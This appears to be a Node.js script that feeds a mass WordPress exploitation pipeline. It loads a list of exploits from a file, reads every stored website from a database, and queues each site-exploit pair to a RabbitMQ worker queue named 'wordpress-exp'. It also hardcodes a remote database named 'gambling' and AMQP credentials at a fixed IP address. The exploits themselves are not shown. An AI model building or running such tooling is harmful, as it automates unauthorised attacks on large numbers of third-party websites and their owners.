process.env.RETHINKDB_URL = "rethinkdb://207.38.84.54/gambling";
process.env.RABBITMQ_URL = "amqp://test:test@207.38.84.54";
require('coffee-script/register')
const db = require('seokit-db');
const debug = require('debug')(__filename);
import autobind from 'autobind-decorator'
const stream = require('stream');
const util = require('util');
const fs = require('fs');
const async = require('async');
const Writable = stream.Writable;
const amqp = require('amqplib');
const RABBITMQ_URL = process.env.RABBITMQ_URL || 'amqp://localhost';
import {EventEmitter} from 'events'


const exploits = fs.readFileSync(__dirname+'/exploits.txt','utf8').trim().split('\n');
console.log(exploits);


@autobind
class Sender {

	channelName = 'wordpress-exp';
	maxCount = 1000;

	constructor() {
		this.start()
	}

	async start() {
		this.connection = await amqp.connect(RABBITMQ_URL);
		this.channel = await this.connection.createChannel();
		this.channel.assertQueue(this.channelName, {durable: true}).then(console.log);
		async.eachLimit(exploits,1,this.checkNext)
	}

	async checkNext(exploit,next) {
		let sendStream = this.createSendStream(exploit);
		db('Website',model=>{
			let reader = model.find().cursor();
			reader.pipe(sendStream).on('finish', _=> {
				console.log('Done');
				next();
			});
		});
	}

	createSendStream(exploit) {
		function SendStream(options) { Writable.call(this, options) };
		util.inherits(SendStream, Writable);
		let i = 0;
		SendStream.prototype._write = (website, enc, callback) => {
			let msg = JSON.stringify({website,exploit});
			this.channel.sendToQueue(this.channelName, new Buffer(msg), {persistent: true});
			if (++i > 1000) {
				i = 0;
				this.checkQueueLength(callback)
			} else {
				callback()
			}
		};
		return new SendStream({objectMode: true});
	}

	async checkQueueLength(callback) {
		let {messageCount} = await this.channel.checkQueue(this.channelName);
		console.log('checkQueueLength',messageCount);
		if (messageCount === undefined || messageCount >= this.maxCount) {
			setTimeout(_=>{
				this.checkQueueLength(callback)
			},200)
		} else {
			callback()
		}
	}

}


new Sender();